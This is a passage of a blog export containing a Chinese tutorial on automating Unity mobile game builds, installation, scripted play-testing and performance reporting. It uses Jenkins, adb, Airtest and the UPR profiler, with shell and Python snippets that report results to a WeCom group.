1.2协议将处理连接。\n</code></pre>"},{"title":"Unity后工业化流程","date":"2020-06-20T03:41:32.000Z","_content":"\n# Unity后工业化流程\n\n* 1 后工业自动化:是创建游戏之后,需要验证这个游戏的整个流程,并且输出性能评测数据,报告给具体的开发人员.形成一个内环开发链,有输入有输出.\n* 2 第一步:打包自动化(例如:打 apk,ipa,app,exe等).\n* 3 第二步:安装游戏(中间涉及到 adb 的使用,root 手机等)\n* 4 第三步:连接 UPR,并启动游戏\n* 5 第四步:开启自动玩游戏流程.\n* 6 第五步:分析性能报告输出结果,报告给每一位开发人员.\n* 7 第六步:资源,AB包的检查自动化,此流程可自成一条线,但也属于 Unity 后工业流程化的一部分.\n\n***\n\n# 成本\n* 1 开发人员一名;\n* 2 mac 电脑一台;\n* 3 Android手机一部,尽量 root,此 root 会减少搭建流程中的很多细节问题;\n* 4 Jenkins 基本操作,安装并且创建任务,得到可执行结果.(官网:https://www.jenkins.io/)\n* 5 shell 基础(基本学习:https://www.runoob.com/linux/linux-shell.html ;  https://www.bilibili.com/video/BV1bg4y1i7Zj)\n* 6 Python 基础(B 站上找个全套 Python 看完即可)\n* 7 Unity 打包(https://docs.unity3d.com/Manual/CommandLineArguments.html)\n* 8 UPR 基础操作(https://upr.unity.cn/instructions)\n* 9 Airtest IDE 软件操作(http://airtest.netease.com/)\n* 10 一定要 shell,Python,Unity,Jenkins,UPR,Airtest,adb 串联起来才可以搭建起来整个流程.\n\n***\n\n# 准备\n\n* 1 安装 [Jenkins](https://www.jenkins.io/),具体的配置请查看教程: https://www.jianshu.com/p/5ad61bb45b32\n* 2 安装 Unity ,官网下载安装即可.\n* 3 安装 Python ,安装 3.7 版本,如果安装了 Python3.8 也是可以做的.\n* 4 安装 Airtest IDE ,直接下载即可,本教程中采取的是 AirtestIDE.app的使用,没有使用 Python 环境打造.\n* 5 下载 UPR mac 版到电脑,放在工作文件夹中.请查看官网https://upr.unity.cn/ \n\n***\n\n# 工业化流程\n\n* 1 创建一个 Jenkins 任务,选择自由构建,最终会执行一个脚本.以下代码为 shell 脚本里面的代码,最终会在 Jenkins 里面执行.\n![Jenkins配置1](Jenkins配置1.png)\n![Jenkins配置2](Jenkins配置2.png)\n\n* 2 在 SVN 上面创建一个文件夹,用来存放当前教程中用到的工具以及代码\n![SVN 目录](SVN目录.png)\n\n* 3:介绍从 shell 脚本Auto_Check_All.sh 运行到打包GetAndReport.py 的步骤.首先是 Unity 打包策略.也就是第一步,形成打包自动化,真正的 Jenkins 打包界面是需要很多参数形成的,此流程仅仅为了方便,因此做简化.需要注意的是,此打包方式一定是开发模式.(请移步官网 https://docs.unity3d.com/Manual/CommandLineArguments.html)\n```\n    # unity 中可以执行命令的文件路径\n    UNITY_PATH=/Applications/Unity/Unity.app/Contents/MacOS/Unity\n    # 项目路径\n    PROJECT_PATH= xxx/xxx/\n    # 打包之前先杀掉所有打开的 Unity 工程\n    killall Unity\n    # 进行打包,这个地方不懂的可以查看https://github.com/xinzhuzi/UnityTools 进行模拟操作\n    ${UNITY_PATH} -quit -projectPath ${PROJECT_PATH} -executeMethod ProjectBuild.BuildForAndroid_DEV  -logFile ${PROJECT_PATH}/build.txt\n```\n\n* 4:统一 adb 工具,将 AirTestIDE 中的 ADB工具 与 UPR MAC版工具中的数据保持一致.我使用的是直接将AirTestIDE中的 adb 覆盖到 UPR 中.AirTestIDE中的 adb路径为:/Applications/AirtestIDE.app/Contents/MacOS/airtest/core/android/static/adb/mac/adb,使用AirTestIDE链接手机,有时候是硬件问题,有时候是软件问题,都可以在官网或者官网群里面解决,里面的网易小姐姐很善良,人又聪明,说话还好听.(一定要连接正常,如有操作错误,请移步官网教程:http://airtest.netease.com/tutorial/Tutorial.html)\n\n* 5:我使用的是小米系列,有时候需要亮屏操作,这一步有的要有的不要,自行摘选即可.\n```\n    # 亮屏,xxx是 UPR 的路径\n    cd xxx\n    if [ \"$(xxx/platform-tools/adb shell dumpsys power | grep state= | grep -oE '(ON|OFF)')\" == OFF ] ; then\n        echo \"Screen is off. Turning on.\"\n        ./adb shell input keyevent 26 # wakeup\n        # ./adb shell input keyevent 82 # unlock\n        echo \"OK, should be on now.\"\n    fi\n```\n\n* 6:覆盖安装apk\n```\n    # adb devices\n    # 卸载这个 app,目前这一步在启动 APP 的时候会产生Android弹框,不推荐使用,如果 root 手机可以避免这一步,或者其他手段可以避免,则执行这一步是最好的\n    # adb uninstall  (apk的唯一标示符)\n    # 覆盖安装这个 app,此 APK 一定是开发者模式的 APK\n    cd UPR路径/platform-tools/\n    ./adb install -r xxx/xxx.apk\n```\n\n* 7 先开启另一个进程,在此进程中进行自动停止 UPR 的检测,所以为什么前面 Jenkins 上面需要时间限制,就是在模拟真实玩家可以玩游戏玩多久,有轻度用户,重度用户之分.具体细则还需要大家慢慢扩展.\n```\n    # 多少毫秒后暂停玩游戏,xxx 表示随意路径\n    open -n \"xxx/Auto_End_Game.sh\"\n    ############################################\n    # Auto_End_Game内容很简单,只有 3 行\n    sleep ${Runtime} #默认暂停 500s,也就是玩游戏大约有 500s 左右的时间,其他操作请自行扩展,比如自定义截图等\n    cd UPR路径\n    ./UnityPerfProfiler --stop\n```\n\n* 8:自动化玩游戏\n我采用的策略比较粗暴.打开 Airtest IDE 软件,并一直连接上 Android 手机,编写自动化玩游戏的代码,编写代码需要根据游戏自行编写,因为在脚本里面提前启动此 app,所有我在自动化玩游戏里面先休眠了 30s,等待游戏开启.此软件在之后的正式流程下会一直连接在手机上面,并且一直开着.\n自动化流程脚本里面编写:\n```\n    # 开始自动化玩游戏,将AirtestIDE设置为焦点,5 秒之后模拟按下 F5,启动自动化玩游戏\n    # 首先暂停 2s,防止前面代码与下面代码带来冲突\n    sleep 2s\n    # 将打开的AirtestIDE.app 变为焦点app,也就是屏幕最前方的一个 app\n    open -a \"/Applications/AirtestIDE.app\"\n    # 暂停 5s ,避免冲突\n    sleep 5s\n    # 模拟按下 F5,启动自动化玩游戏\n    function prompt() {\n      osascript &lt;&lt;EOT\n        tell application \"System Events\"\n          key code 96\n        end tell\n    EOT\n    }\n    value=\"$(prompt)\"\n```\n\n* 9:启动连接到 UPR 服务,此时会UPR自动启动游戏.\n```\n    # Adb 启动游戏,目前不适用\n    # ./adb shell am start -n com.xlcw.twgame.cn/com.unity3d.player.UnityPlayerActivity\n\n    # 启动 UPR,这个线程到最后都会卡住,SessionId 表示在 UPP 官网上面创建的测试 id\n    首先获取SessionId,使用 Python 脚本获取\n    SessionId=`python3 xxx/UPR_Get_SessionId.py`\n    echo $SessionId\n    # 这个地方具体请看官网的操作\n    cd UPR路径\n    ./UnityPerfProfiler -p ip地址 -s ${SessionId}  -n com.xlcw.twgame.cn    \n```\n\n* 10:python 脚本UPR_Get_SessionId.py 进行创建SessionId\n```\n    url = \"https://upr.unity.cn/backend/sessions/create\"\n    # 其中parameter需要自己上网页里面查看是什么,每个人的项目中都不一样,这个地方不贴这些东西了,必填;\n    # cookies也一样,必填;\n    # headers不填也行.\n    res = requests.post(url=url, data=parameter,\n                            headers=headers_post, cookies=cookies)\n    print(json.loads(res.text)[\"SessionId\"])\n    # 这样执行完毕之后,即可在 shell 脚本里面拿到这个值\n```\n\n![性能检测.png](性能检测.png)   \n![资源检测.png](资源检测.png)\n\n*  11:数据二次处理\n等待Auto_End_Game脚本结束,停止UPR,(可选操作:关闭 app,执行完毕AirtestIDE.app 中的自动玩游戏代码,关闭AirtestIDE.app等).等待 10s 之后,使用 Python 进行二次数据处理,具体到某一函数,资源,发送给具体的开发人员.最后,将数据分析结果发送到企业微信群里面.此时可以根据每个开发人员的情况进行分发处理任务.\n```\n    #shell 脚本里面编写\n    python3 xxx/GetAndReport.py ${SessionId}\n\n    #python文件 GetAndReport.py 中编写\n    # headers_get中包含 cookie,请自行查找.\n    res = requests.get(\n            \"https://upr.unity.cn/backend/summary/\" + SessionId, headers=headers_get)\n    # 得到结果之后,进行二次处理,比如我这边就只处理了整体数据\n    jd = json.loads(res.text)\n    data = \"\\n性能数据:{\" + \"ReservedMono峰值:\" + \\\n            str(jd[\"summary\"][\"maxReservedMono\"]) + \"MB,\" + \"纹理资源峰值:\" + \\\n            str(jd[\"summary\"][\"maxTexture\"]) + \"MB,\" + \"动画资源峰值:\" + \\\n            str(jd[\"summary\"][\"maxAnimationClip\"]) + \"MB,\" + \\\n            \"音频资源峰值:\" + str(jd[\"summary\"][\"maxAudio\"]) + \"MB,\" + \\\n            \"网格资源峰值:\" + str(jd[\"summary\"][\"maxMesh\"]) + \"MB,\" + \\\n            \"DrawCall峰值:\" + str(jd[\"summary\"][\"maxDrawCalls\"]) + \"次,\" + \\\n            \"Tris峰值:\" + str(jd[\"summary\"][\"maxTriangles\"]) + \"面\" + \"}\"\n\n    # 然后上报企业微信里面,这个需要根据企业微信进行定制开发,官网:https://work.weixin.qq.com/ \n```\n\n![最终@所有人.png](最终@所有人.png)\n\n* 12:资源与 AB 包检测,根据官网的 shell 写法,直接在 Jenkins 里面输出即可,处理二次数据与上面方式一样.\n\n*** \n\n# 代码窥探\n\n![Auto_Check_All.png](Auto_Check_All.png)\n![Auto_End_Game.png](Auto_End_Game.png)\n![Get_Sessionid.png](Get_Sessionid.png)\n![Report_All.png](Report_All.png)\n\n\n***\n# 开始\n\n* 1 点击 Jenkins 上面的构建按钮,等待自动发出项目报告.\n\n***\n# 结束\n* 1 最终的流程是:自动化打包--&gt;自动化安装apk--&gt;自动化玩游戏--&gt;自动化输出性能报告.\n* 2 其中只需要 Python 自动化玩游戏的维护成本即可.\n* 3 购买UPR企业服务，可以获得更好的性能优化技术支持和更稳定的自动化测试体验。\n* 4 为项目节省时间,为公司创造价值,为游戏行业奠定 Unity后工业化流程.\n***\n# 广告\n* 1 明显效益:可以节省研发人员成本.隐藏效益:嗯~~~,也可以将很多测试人员干掉,为公司节省财富,不过我不建议老板这么干.\n* 2 请一定重视这个 <<Unity后工业化流程>> ,搭建成功就可以为一个项目节省大量时间;推广到整个公司,就能为公司带来巨大效益;如果整个游戏行业都有这个流程,那就是一场改革.\n* 3 本公司招人\n![job.jpg](job.jpg)\n","source":"_posts/Unity/IndustrialAutomation/Unity后工业化流程.md","raw":"---\ntitle:  Unity后工业化流程\ndate: 2020-06-20 11:41:32\ncategories:\n- Unity\ntags:\n- IndustrialAutomation\n---\n\n# Unity后工业化流程\n\n* 1 后工业自动化:是创建游戏之后,需要验证这个游戏的整个流程,并且输出性能评测数据,报告给具体的开发人员.形成一个内环开发链,有输入有输出.\n* 2 第一步:打包自动化(例如:打 apk,ipa,app,exe等).\n* 3 第二步:安装游戏(中间涉及到 adb 的使用,root 手机等)\n* 4 第三步:连接 UPR,并启动游戏\n* 5 第四步:开启自动玩游戏流程.\n* 6 第五步:分析性能报告输出结果,报告给每一位开发人员.\n* 7 第六步:资源,AB包的检查自动化,此流程可自成一条线,但也属于 Unity 后工业流程化的一部分.\n\n***\n\n# 成本\n* 1 开发人员一名;\n* 2 mac 电脑一台;\n* 3 Android手机一部,尽量 root,此 root 会减少搭建流程中的很多细节问题;\n* 4 Jenkins 基本操作,安装并且创建任务,得到可执行结果.(官网:https://www.jenkins.io/)\n* 5 shell 基础(基本学习:https://www.runoob.com/linux/linux-shell.html ;  https://www.bilibili.com/video/BV1bg4y1i7Zj)\n* 6 Python 基础(B 站上找个全套 Python 看完即可)\n* 7 Unity 打包(https://docs.unity3d.com/Manual/CommandLineArguments.html)\n* 8 UPR 基础操作(https://upr.unity.cn/instructions)\n* 9 Airtest IDE 软件操作(http://airtest.netease.com/)\n* 10 一定要 shell,Python,Unity,Jenkins,UPR,Airtest,adb 串联起来才可以搭建起来整个流程.\n\n***\n\n# 准备\n\n* 1 安装 [Jenkins](https://www.jenkins.io/),具体的配置请查看教程: https://www.jianshu.com/p/5ad61bb45b32\n* 2 安装 Unity ,官网下载安装即可.\n* 3 安装 Python ,安装 3.7 版本,如果安装了 Python3.8 也是可以做的.\n* 4 安装 Airtest IDE ,直接下载即可,本教程中采取的是 AirtestIDE.app的使用,没有使用 Python 环境打造.\n* 5 下载 UPR mac 版到电脑,放在工作文件夹中.请查看官网https://upr.unity.cn/ \n\n***\n\n# 工业化流程\n\n* 1 创建一个 Jenkins 任务,选择自由构建,最终会执行一个脚本.以下代码为 shell 脚本里面的代码,最终会在 Jenkins 里面执行.\n![Jenkins配置1](Jenkins配置1.png)\n![Jenkins配置2](Jenkins配置2.png)\n\n* 2 在 SVN 上面创建一个文件夹,用来存放当前教程中用到的工具以及代码\n![SVN 目录](SVN目录.png)\n\n* 3:介绍从 shell 脚本Auto_Check_All.sh 运行到打包GetAndReport.py 的步骤.首先是 Unity 打包策略.也就是第一步,形成打包自动化,真正的 Jenkins 打包界面是需要很多参数形成的,此流程仅仅为了方便,因此做简化.需要注意的是,此打包方式一定是开发模式.(请移步官网 https://docs.unity3d.com/Manual/CommandLineArguments.html)\n```\n    # unity 中可以执行命令的文件路径\n    UNITY_PATH=/Applications/Unity/Unity.app/Contents/MacOS/Unity\n    # 项目路径\n    PROJECT_PATH= xxx/xxx/\n    # 打包之前先杀掉所有打开的 Unity 工程\n    killall Unity\n    # 进行打包,这个地方不懂的可以查看https://github.com/xinzhuzi/UnityTools 进行模拟操作\n    ${UNITY_PATH} -quit -projectPath ${PROJECT_PATH} -executeMethod ProjectBuild.BuildForAndroid_DEV  -logFile ${PROJECT_PATH}/build.txt\n```\n\n* 4:统一 adb 工具,将 AirTestIDE 中的 ADB工具 与 UPR MAC版工具中的数据保持一致.我使用的是直接将AirTestIDE中的 adb 覆盖到 UPR 中.AirTestIDE中的 adb路径为:/Applications/AirtestIDE.app/Contents/MacOS/airtest/core/android/static/adb/mac/adb,使用AirTestIDE链接手机,有时候是硬件问题,有时候是软件问题,都可以在官网或者官网群里面解决,里面的网易小姐姐很善良,人又聪明,说话还好听.(一定要连接正常,如有操作错误,请移步官网教程:http://airtest.netease.com/tutorial/Tutorial.html)\n\n* 5:我使用的是小米系列,有时候需要亮屏操作,这一步有的要有的不要,自行摘选即可.\n```\n    # 亮屏,xxx是 UPR 的路径\n    cd xxx\n    if [ \"$(xxx/platform-tools/adb shell dumpsys power | grep state= | grep -oE '(ON|OFF)')\" == OFF ] ; then\n        echo \"Screen is off. Turning on.\"\n        ./adb shell input keyevent 26 # wakeup\n        # ./adb shell input keyevent 82 # unlock\n        echo \"OK, should be on now.\"\n    fi\n```\n\n* 6:覆盖安装apk\n```\n    # adb devices\n    # 卸载这个 app,目前这一步在启动 APP 的时候会产生Android弹框,不推荐使用,如果 root 手机可以避免这一步,或者其他手段可以避免,则执行这一步是最好的\n    # adb uninstall  (apk的唯一标示符)\n    # 覆盖安装这个 app,此 APK 一定是开发者模式的 APK\n    cd UPR路径/platform-tools/\n    ./adb install -r xxx/xxx.apk\n```\n\n* 7 先开启另一个进程,在此进程中进行自动停止 UPR 的检测,所以为什么前面 Jenkins 上面需要时间限制,就是在模拟真实玩家可以玩游戏玩多久,有轻度用户,重度用户之分.具体细则还需要大家慢慢扩展.\n```\n    # 多少毫秒后暂停玩游戏,xxx 表示随意路径\n    open -n \"xxx/Auto_End_Game.sh\"\n    ############################################\n    # Auto_End_Game内容很简单,只有 3 行\n    sleep ${Runtime} #默认暂停 500s,也就是玩游戏大约有 500s 左右的时间,其他操作请自行扩展,比如自定义截图等\n    cd UPR路径\n    ./UnityPerfProfiler --stop\n```\n\n* 8:自动化玩游戏\n我采用的策略比较粗暴.打开 Airtest IDE 软件,并一直连接上 Android 手机,编写自动化玩游戏的代码,编写代码需要根据游戏自行编写,因为在脚本里面提前启动此 app,所有我在自动化玩游戏里面先休眠了 30s,等待游戏开启.此软件在之后的正式流程下会一直连接在手机上面,并且一直开着.\n自动化流程脚本里面编写:\n```\n    # 开始自动化玩游戏,将AirtestIDE设置为焦点,5 秒之后模拟按下 F5,启动自动化玩游戏\n    # 首先暂停 2s,防止前面代码与下面代码带来冲突\n    sleep 2s\n    # 将打开的AirtestIDE.app 变为焦点app,也就是屏幕最前方的一个 app\n    open -a \"/Applications/AirtestIDE.app\"\n    # 暂停 5s ,避免冲突\n    sleep 5s\n    # 模拟按下 F5,启动自动化玩游戏\n    function prompt() {\n      osascript &lt;&lt;EOT\n        tell application \"System Events\"\n          key code 96\n        end tell\n    EOT\n    }\n    value=\"$(prompt)\"\n```\n\n* 9:启动连接到 UPR 服务,此时会UPR自动启动游戏.\n```\n    # Adb 启动游戏,目前不适用\n    # ./adb shell am start -n com.xlcw.twgame.cn/com.unity3d.player.UnityPlayerActivity\n\n    # 启动 UPR,这个线程到最后都会卡住,SessionId 表示在 UPP 官网上面创建的测试 id\n    首先获取SessionId,使用 Python 脚本获取\n    SessionId=`python3 xxx/UPR_Get_SessionId.py`\n    echo $SessionId\n    # 这个地方具体请看官网的操作\n    cd UPR路径\n    ./UnityPerfProfiler -p ip地址 -s ${SessionId}  -n com.xlcw.twgame.cn    \n```\n\n* 10:python 脚本UPR_Get_SessionId.py 进行创建SessionId\n```\n    url = \"https://upr.unity.cn/backend/sessions/create\"\n    # 其中parameter需要自己上网页里面查看是什么,每个人的项目中都不一样,这个地方不贴这些东西了,必填;\n    # cookies也一样,必填;\n    # headers不填也行.\n    res = requests.post(url=url, data=parameter,\n                            headers=headers_post, cookies=cookies)\n    print(json.loads(res.text)[\"SessionId\"])\n    # 这样执行完毕之后,即可在 shell 脚本里面拿到这个值\n```\n\n![性能检测.png](性能检测.png)   \n![资源检测.png](资源检测.png)\n\n*  11:数据二次处理\n等待Auto_End_Game脚本结束,停止UPR,(可选操作:关闭 app,执行完毕AirtestIDE.app 中的自动玩游戏代码,关闭AirtestIDE.app等).等待 10s 之后,使用 Python 进行二次数据处理,具体到某一函数,资源,发送给具体的开发人员.最后,将数据分析结果发送到企业微信群里面.此时可以根据每个开发人员的情况进行分发处理任务.\n```\n    #shell 脚本里面编写\n    python3 xxx/GetAndReport.py ${SessionId}\n\n    #python文件 GetAndReport.py 中编写\n    # headers_get中包含 cookie,请自行查找.\n    res = requests.get(\n            \"https://upr.unity.cn/backend/summary/\" + SessionId, headers=headers_get)\n    # 得到结果之后,进行二次处理,比如我这边就只处理了整体数据\n    jd = json.loads(res.text)\n    data = \"\\n性能数据:{\" + \"ReservedMono峰值:\" + \\\n            str(jd[\"summary\"][\"maxReservedMono\"]) + \"MB,\" + \"纹理资源峰值:\" + \\\n            str(jd[\"summary\"][\"maxTexture\"]) + \"MB,\" + \"动画资源峰值:\" + \\\n            str(jd[\"summary\"][\"maxAnimationClip\"]) + \"MB,\" + \\\n            \"音频资源峰值:\" + str(jd[\"summary\"][\"maxAudio\"]) + \"MB,\" + \\\n            \"网格资源峰值:\" + str(jd[\"summary\"][\"maxMesh\"]) + \"MB,\" + \\\n            \"DrawCall峰值:\" + str(jd[\"summary\"][\"maxDrawCalls\"]) + \"次,\" + \\\n            \"Tris峰值:\" + str(jd[\"summary\"][\"maxTriangles\"]) + \"面\" + \"}\"\n\n    # 然后上报企业微信里面,这个需要根据企业微信进行定制开发,官网:https://work.weixin.qq.com/ \n```\n\n![最终@所有人.png](最终@所有人.png)\n\n* 12:资源与 AB 包检测,根据官网的 shell 写法,直接在 Jenkins 里面输出即可,处理二次数据与上面方式一样.\n\n*** \n\n# 代码窥探\n\n![Auto_Check_All.png](Auto_Check_All.png)\n![Auto_End_Game.png](Auto_End_Game.png)\n![Get_Sessionid.png](Get_Sessionid.png)\n![Report_All.png](Report_All.png)\n\n\n***\n# 开始\n\n* 1 点击 Jenkins 上面的构建按钮,等待自动发出项目报告.\n\n***\n# 结束\n* 1 最终的流程是:自动化打包--&gt;自动化安装apk--&gt;自动化玩游戏--&gt;自动化输出性能报告.\n* 2 其中只需要 Python 自动化玩游戏的维护成本即可.\n* 3 购买UPR企业服务，可以获得更好的性能优化技术支持和更稳定的自动化测试体验。\n* 4 为项目节省时间,为公司创造价值,为游戏行业奠定 Unity后工业化流程.\n***\n# 广告\n* 1 明显效益:可以节省研发人员成本.隐藏效益:嗯~~~,也可以将很多测试人员干掉,为公司节省财富,不过我不建议老板这么干.\n* 2 请一定重视这个 <<Unity后工业化流程>> ,搭建成功就可以为一个项目节省大量时间;推广到整个公司,就能为公司带来巨大效益;如果整个游戏行业都有这个流程,那就是一场改革.\n* 3 本公司招人\n![job.jpg](job.jpg)\n","slug":"Unity/IndustrialAutomation/Unity后工业化流程","published":1,"updated":"2020-06-28T12:23:21.294Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czz002t2gk74r0i0siq","content":"<h1 id=\"Unity后工业化流程\"><a href=\"#Unity后工业化流程\" class=\"headerlink\" title=\"Unity后工业化流程\"></a>Unity后工业化流程</h1><ul>\n<li>1 后工业自动化:是创建游戏之后,需要验证这个游戏的整个流程,并且输出性能评测数据,报告给具体的开发人员.形成一个内环开发链,有输入有输出.</li>\n<li>2 第一步:打包自动化(例如:打 apk,ipa,app,exe等).</li>\n<li>3 第二步:安装游戏(中间涉及到 adb 的使用,root 手机等)</li>\n<li>4 第三步:连接 UPR,并启动游戏</li>\n<li>5 第四步:开启自动玩游戏流程.</li>\n<li>6 第五步:分析性能报告输出结果,报告给每一位开发人员.</li>\n<li>7 第六步:资源,AB包的检查自动化,此流程可自成一条线,但也属于 Unity 后工业流程化的一部分.</li>\n</ul>\n<hr>\n<h1 id=\"成本\"><a href=\"#成本\" class=\"headerlink\" title=\"成本\"></a>成本</h1><ul>\n<li>1 开发人员一名;</li>\n<li>2 mac 电脑一台;</li>\n<li>3 Android手机一部,尽量 root,此 root 会减少搭建流程中的很多细节问题;</li>\n<li>4 Jenkins 基本操作,安装并且创建任务,得到可执行结果.(官网:<a href=\"https://www.jenkins.io/\" target=\"_blank\" rel=\"noopener\">https://www.jenkins.io/</a>)</li>\n<li>5 shell 基础(基本学习:<a href=\"https://www.runoob.com/linux/linux-shell.html\" target=\"_blank\" rel=\"noopener\">https://www.runoob.com/linux/linux-shell.html</a> ;  <a href=\"https://www.bilibili.com/video/BV1bg4y1i7Zj\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1bg4y1i7Zj</a>)</li>\n<li>6 Python 基础(B 站上找个全套 Python 看完即可)</li>\n<li>7 Unity 打包(<a href=\"https://docs.unity3d.com/Manual/CommandLineArguments.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/CommandLineArguments.html</a>)</li>\n<li>8 UPR 基础操作(<a href=\"https://upr.unity.cn/instructions\" target=\"_blank\" rel=\"noopener\">https://upr.unity.cn/instructions</a>)</li>\n<li>9 Airtest IDE 软件操作(<a href=\"http://airtest.netease.com/\" target=\"_blank\" rel=\"noopener\">http://airtest.netease.com/</a>)</li>\n<li>10 一定要 shell,Python,Unity,Jenkins,UPR,Airtest,adb 串联起来才可以搭建起来整个流程.</li>\n</ul>\n<hr>\n<h1 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h1><ul>\n<li>1 安装 <a href=\"https://www.jenkins.io/\" target=\"_blank\" rel=\"noopener\">Jenkins</a>,具体的配置请查看教程: <a href=\"https://www.jianshu.com/p/5ad61bb45b32\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/5ad61bb45b32</a></li>\n<li>2 安装 Unity ,官网下载安装即可.</li>\n<li>3 安装 Python ,安装 3.7 版本,如果安装了 Python3.8 也是可以做的.</li>\n<li>4 安装 Airtest IDE ,直接下载即可,本教程中采取的是 AirtestIDE.app的使用,没有使用 Python 环境打造.</li>\n<li>5 下载 UPR mac 版到电脑,放在工作文件夹中.请查看官网<a href=\"https://upr.unity.cn/\" target=\"_blank\" rel=\"noopener\">https://upr.unity.cn/</a> </li>\n</ul>\n<hr>\n<h1 id=\"工业化流程\"><a href=\"#工业化流程\" class=\"headerlink\" title=\"工业化流程\"></a>工业化流程</h1><ul>\n<li><p>1 创建一个 Jenkins 任务,选择自由构建,最终会执行一个脚本.以下代码为 shell 脚本里面的代码,最终会在 Jenkins 里面执行.<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Jenkins%E9%85%8D%E7%BD%AE1.png\" alt=\"Jenkins配置1\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Jenkins%E9%85%8D%E7%BD%AE2.png\" alt=\"Jenkins配置2\"></p>\n</li>\n<li><p>2 在 SVN 上面创建一个文件夹,用来存放当前教程中用到的工具以及代码<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/SVN%E7%9B%AE%E5%BD%95.png\" alt=\"SVN 目录\"></p>\n</li>\n<li><p>3:介绍从 shell 脚本Auto_Check_All.sh 运行到打包GetAndReport.py 的步骤.首先是 Unity 打包策略.也就是第一步,形成打包自动化,真正的 Jenkins 打包界面是需要很多参数形成的,此流程仅仅为了方便,因此做简化.需要注意的是,此打包方式一定是开发模式.(请移步官网 <a href=\"https://docs.unity3d.com/Manual/CommandLineArguments.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/CommandLineArguments.html</a>)</p>\n<pre><code>  # unity 中可以执行命令的文件路径\n  UNITY_PATH=/Applications/Unity/Unity.app/Contents/MacOS/Unity\n  # 项目路径\n  PROJECT_PATH= xxx/xxx/\n  # 打包之前先杀掉所有打开的 Unity 工程\n  killall Unity\n  # 进行打包,这个地方不懂的可以查看https://github.com/xinzhuzi/UnityTools 进行模拟操作\n  ${UNITY_PATH} -quit -projectPath ${PROJECT_PATH} -executeMethod ProjectBuild.BuildForAndroid_DEV  -logFile ${PROJECT_PATH}/build.txt</code></pre></li>\n<li><p>4:统一 adb 工具,将 AirTestIDE 中的 ADB工具 与 UPR MAC版工具中的数据保持一致.我使用的是直接将AirTestIDE中的 adb 覆盖到 UPR 中.AirTestIDE中的 adb路径为:/Applications/AirtestIDE.app/Contents/MacOS/airtest/core/android/static/adb/mac/adb,使用AirTestIDE链接手机,有时候是硬件问题,有时候是软件问题,都可以在官网或者官网群里面解决,里面的网易小姐姐很善良,人又聪明,说话还好听.(一定要连接正常,如有操作错误,请移步官网教程:<a href=\"http://airtest.netease.com/tutorial/Tutorial.html\" target=\"_blank\" rel=\"noopener\">http://airtest.netease.com/tutorial/Tutorial.html</a>)</p>\n</li>\n<li><p>5:我使用的是小米系列,有时候需要亮屏操作,这一步有的要有的不要,自行摘选即可.</p>\n<pre><code>  # 亮屏,xxx是 UPR 的路径\n  cd xxx\n  if [ &quot;$(xxx/platform-tools/adb shell dumpsys power | grep state= | grep -oE &#39;(ON|OFF)&#39;)&quot; == OFF ] ; then\n      echo &quot;Screen is off. Turning on.&quot;\n      ./adb shell input keyevent 26 # wakeup\n      # ./adb shell input keyevent 82 # unlock\n      echo &quot;OK, should be on now.&quot;\n  fi</code></pre></li>\n<li><p>6:覆盖安装apk</p>\n<pre><code>  # adb devices\n  # 卸载这个 app,目前这一步在启动 APP 的时候会产生Android弹框,不推荐使用,如果 root 手机可以避免这一步,或者其他手段可以避免,则执行这一步是最好的\n  # adb uninstall  (apk的唯一标示符)\n  # 覆盖安装这个 app,此 APK 一定是开发者模式的 APK\n  cd UPR路径/platform-tools/\n  ./adb install -r xxx/xxx.apk</code></pre></li>\n<li><p>7 先开启另一个进程,在此进程中进行自动停止 UPR 的检测,所以为什么前面 Jenkins 上面需要时间限制,就是在模拟真实玩家可以玩游戏玩多久,有轻度用户,重度用户之分.具体细则还需要大家慢慢扩展.</p>\n<pre><code>  # 多少毫秒后暂停玩游戏,xxx 表示随意路径\n  open -n &quot;xxx/Auto_End_Game.sh&quot;\n  ############################################\n  # Auto_End_Game内容很简单,只有 3 行\n  sleep ${Runtime} #默认暂停 500s,也就是玩游戏大约有 500s 左右的时间,其他操作请自行扩展,比如自定义截图等\n  cd UPR路径\n  ./UnityPerfProfiler --stop</code></pre></li>\n<li><p>8:自动化玩游戏<br>我采用的策略比较粗暴.打开 Airtest IDE 软件,并一直连接上 Android 手机,编写自动化玩游戏的代码,编写代码需要根据游戏自行编写,因为在脚本里面提前启动此 app,所有我在自动化玩游戏里面先休眠了 30s,等待游戏开启.此软件在之后的正式流程下会一直连接在手机上面,并且一直开着.<br>自动化流程脚本里面编写:</p>\n<pre><code>  # 开始自动化玩游戏,将AirtestIDE设置为焦点,5 秒之后模拟按下 F5,启动自动化玩游戏\n  # 首先暂停 2s,防止前面代码与下面代码带来冲突\n  sleep 2s\n  # 将打开的AirtestIDE.app 变为焦点app,也就是屏幕最前方的一个 app\n  open -a &quot;/Applications/AirtestIDE.app&quot;\n  # 暂停 5s ,避免冲突\n  sleep 5s\n  # 模拟按下 F5,启动自动化玩游戏\n  function prompt() {\n    osascript &amp;lt;&amp;lt;EOT\n      tell application &quot;System Events&quot;\n        key code 96\n      end tell\n  EOT\n  }\n  value=&quot;$(prompt)&quot;</code></pre></li>\n<li><p>9:启动连接到 UPR 服务,此时会UPR自动启动游戏.</p>\n<pre><code>  # Adb 启动游戏,目前不适用\n  # ./adb shell am start -n com.xlcw.twgame.cn/com.unity3d.player.UnityPlayerActivity\n\n  # 启动 UPR,这个线程到最后都会卡住,SessionId 表示在 UPP 官网上面创建的测试 id\n  首先获取SessionId,使用 Python 脚本获取\n  SessionId=`python3 xxx/UPR_Get_SessionId.py`\n  echo $SessionId\n  # 这个地方具体请看官网的操作\n  cd UPR路径\n  ./UnityPerfProfiler -p ip地址 -s ${SessionId}  -n com.xlcw.twgame.cn    </code></pre></li>\n<li><p>10:python 